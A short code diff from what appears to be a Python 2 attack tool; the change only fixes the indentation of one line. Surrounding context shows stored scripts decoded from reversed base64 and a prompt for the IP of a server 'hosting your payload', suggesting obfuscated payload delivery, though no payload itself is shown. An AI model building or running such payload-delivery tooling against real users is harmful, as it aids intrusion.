@@ -41,7 +41,7 @@ def main():
 	script=""
 	for key,val in scripts.iteritems():
 		if key == option:
-				script=scripts[option]
+			script=scripts[option]
 	lstring = base64.b64decode(script[::-1])
 	lines = lstring[1:-1].split("', '")
 	ip = raw_input("\nEnter server IP address hosting your payload (Example: facebook.serveo.net): ")
